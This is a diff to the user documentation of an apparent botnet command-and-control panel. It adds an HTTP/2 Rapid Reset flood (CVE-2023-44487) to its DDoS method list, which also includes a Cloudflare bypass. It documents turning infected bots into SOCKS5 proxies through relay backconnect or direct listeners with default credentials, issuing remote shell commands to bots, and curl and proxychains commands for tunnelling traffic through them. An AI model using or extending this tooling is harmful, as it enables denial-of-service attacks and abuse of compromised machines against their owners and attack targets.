@@ -234,6 +234,7 @@ Interactive attack configuration form.
 | `!https` | HTTPS/TLS flood |
 | `!tls` | TLS flood (alias) |
 | `!cfbypass` | Cloudflare bypass |
+| `!rapidreset` | HTTP/2 Rapid Reset (CVE-2023-44487) |
 
 ### Method Selector
 
@@ -313,31 +314,26 @@ BOT ID          IP              ARCH      PORT    STATUS
 |-----|--------|-------------|
 | `↑/↓` | Navigate | Select bot |
 | `←/→` | Switch View | Change tab |
-| `s` | Start Socks | Start proxy on selected bot |
+| `s` | Quick Start | Start proxy using pre-configured relay + default credentials |
+| `c` | Custom Relay | Enter relay:port and credentials manually |
+| `d` | Direct Mode | Enter port number, opens local SOCKS5 listener on bot |
 | `x` | Stop Socks | Stop proxy on selected bot |
 | `r` | Refresh | Update status |
 | `q` | Back | Return to dashboard |
 
-### Starting a Proxy
+### SOCKS5 Modes
 
-1. Select a bot with `↑/↓`
-2. Press `s`
-3. Enter port (default: 1080)
-4. Press `Enter`
+**Quick Start (`s`):** Sends `!socks` immediately — bot connects to pre-configured relay endpoints with default credentials.
 
-```
-START SOCKS5 PROXY
-Bot: a1b2c3d4
-▸ Port: 1080█
+**Custom Relay (`c`):** Input form for manual `relay:port` and optional credentials override.
 
-[enter] Start  [esc] Cancel
-```
+**Direct Mode (`d`):** Input form for port number — bot opens a local SOCKS5 listener (no relay needed).
 
 ### SOCKS5 Authentication
 
-The proxy supports username/password authentication (RFC 1929). Credentials are set in `bot/config.go` (`socksUsername` / `socksPassword`) and can be updated at runtime:
+The proxy supports username/password authentication (RFC 1929). Default credentials are set during `setup.py` (default: `vision:vision`) and baked into the bot binary.
 
-- From TUI Socks Manager or remote shell: `!socksauth <user> <pass>`
+- Update at runtime: `!socksauth <user> <pass>`
 - Leave both empty to allow unauthenticated access
 
 ### Using the Proxy
@@ -345,15 +341,17 @@ The proxy supports username/password authentication (RFC 1929). Credentials are 
 After starting, connect via:
 
 ```bash
-# With authentication (default: visionc2 / synackrst666)
-curl --socks5-basic -U visionc2:synackrst666 --socks5 BOT_IP:1080 http://example.com
+# Via relay (backconnect mode — recommended)
+curl --socks5 relay.example.com:1080 -U vision:vision http://example.com
 
-# Configure proxychains
-echo "socks5 BOT_IP 1080 visionc2 synackrst666" >> /etc/proxychains.conf
+# Via direct mode (bot listener)
+curl --socks5 BOT_IP:1080 -U vision:vision http://example.com
 
-# Without auth (if credentials are empty)
-curl --socks5 BOT_IP:1080 http://example.com
+# Configure proxychains (add to /etc/proxychains4.conf)
+socks5 relay.example.com 1080 vision vision
 ```
+
+> Full relay deployment guide: [PROXY.md](PROXY.md)
 
 ---
 
@@ -465,7 +463,10 @@ Example: `!a1b2c3d4 !shell whoami`
 
 | Command | Description |
 |---------|-------------|
-| `!socks <port>` | Start SOCKS5 on port |
+| `!socks` | Start SOCKS5 via pre-configured relay endpoints |
+| `!socks relay:port` | Backconnect to specific relay |
+| `!socks r1:9001,r2:9001` | Multiple relays (comma-separated) |
+| `!socks <port>` | Direct mode — open local listener on port |
 | `!stopsocks` | Stop all proxies |
 | `!socksauth <user> <pass>` | Update SOCKS5 proxy credentials |
 
